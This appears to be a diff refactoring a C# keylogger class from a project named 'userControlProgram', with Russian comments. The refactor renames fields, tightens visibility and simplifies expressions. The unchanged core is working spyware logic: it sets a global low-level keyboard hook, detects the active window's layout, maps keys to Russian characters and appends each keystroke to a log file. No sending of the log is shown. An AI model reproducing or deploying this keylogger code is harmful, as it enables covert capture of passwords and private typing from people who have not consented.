@@ -1,15 +1,12 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
-using userControlProgram.Properties;
 using System.IO;                    
 
 namespace userControlProgram
 {
-    class KeyLogger
+    static class KeyLogger
     {
         [DllImport("user32.dll")]
         static extern IntPtr SetWindowsHookEx(int idHook, KeyboardHookProc callback, IntPtr hInstance, uint threadId);
@@ -40,13 +37,13 @@ namespace userControlProgram
         const int WH_KEYBOARD_LL = 13; 
         const int WM_KEYDOWN = 0x100; 
 
-        private static KeyboardHookProc _proc = HookProc;
+        private static readonly KeyboardHookProc _proc = HookProc;
 
-        private static IntPtr hhook = IntPtr.Zero;
+        private static IntPtr _hhook = IntPtr.Zero;
 
         private static int _processId;
 
-        private static InputLanguageCollection _InstalledInputLanguages;
+        private static InputLanguageCollection _installedInputLanguages;
 
         private static string _currentInputLanguage;
         public static string LogPath;
@@ -57,7 +54,7 @@ namespace userControlProgram
             LogPath = logPath;
             _logName = LogPath + "\\log";
             IntPtr hInstance = LoadLibrary("User32");
-            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
+            _hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
         }
 
 
@@ -66,55 +63,52 @@ namespace userControlProgram
         public static void UnHook()
         {
             // Снятие хука
-            UnhookWindowsHookEx(hhook);
+            UnhookWindowsHookEx(_hhook);
         }
         // Получение раскладки клавиатуры активного окна
         private static string GetKeyboardLayoutId()
         {
-            _InstalledInputLanguages = InputLanguage.InstalledInputLanguages;
+            _installedInputLanguages = InputLanguage.InstalledInputLanguages;
 
             // Получаем хендл активного окна
-            IntPtr hWnd = GetForegroundWindow();
+            var hWnd = GetForegroundWindow();
             // Получаем номер потока активного окна
-            int winThreadProcId = GetWindowThreadProcessId(hWnd, out _processId);
+            var winThreadProcId = GetWindowThreadProcessId(hWnd, out _processId);
             // Получаем раскладку
-            IntPtr keybLayout = GetKeyboardLayout(winThreadProcId);
+            var keybLayout = GetKeyboardLayout(winThreadProcId);
             // Циклом перебираем все установленные языки для проверки идентификатора
-            for (int i = 0; i < _InstalledInputLanguages.Count; i++)
+            for (var i = 0; i < _installedInputLanguages.Count; i++)
             {
-                if (keybLayout == _InstalledInputLanguages[i].Handle)
+                if (keybLayout == _installedInputLanguages[i].Handle)
                 {
-                    _currentInputLanguage = _InstalledInputLanguages[i].Culture.ThreeLetterWindowsLanguageName;
+                    _currentInputLanguage = _installedInputLanguages[i].Culture.ThreeLetterWindowsLanguageName;
                 }
             }
             return _currentInputLanguage;
         }
 
 
-        public static IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam)
+        private static IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam)
         {
             if (code >= 0 && wParam == (IntPtr)0x0101)
             {
                 // Получаем handle активного окна
-                IntPtr hWnd = GetForegroundWindow();
+                var hWnd = GetForegroundWindow();
 
                 // Получаем раскладку активного окна
-                string nowLanguage = GetKeyboardLayoutId();
-                string keyValue;
+                var nowLanguage = GetKeyboardLayoutId();
 
-                int vkCode = Marshal.ReadInt32(lParam);
-                if (nowLanguage == "RUS")
-                    keyValue = SearchRusKey((Keys)vkCode);
-                else keyValue = ((Keys) vkCode).ToString();
+                var vkCode = Marshal.ReadInt32(lParam);
+                var keyValue = nowLanguage == "RUS" ? SearchRusKey((Keys)vkCode) : ((Keys) vkCode).ToString();
                 if (keyValue == ((Keys)vkCode).ToString())
                     keyValue = NumberKeys((Keys) vkCode);
                 WriteLog(keyValue);
                 
             }
-            return CallNextHookEx(hhook, code, (int)wParam, lParam);
+            return CallNextHookEx(_hhook, code, (int)wParam, lParam);
         }
 
-        public static string SearchRusKey(Keys key)
+        private static string SearchRusKey(Keys key)
         {
             switch(key)
             {
@@ -222,9 +216,9 @@ namespace userControlProgram
             }
         }
 
-        public static void WriteLog (string key)
+        private static void WriteLog (string key)
         {
-            StreamWriter logStream = new StreamWriter(_logName, true, Encoding.Default);
+            var logStream = new StreamWriter(_logName, true, Encoding.Default);
             logStream.Write(key);
             logStream.Close();
         }
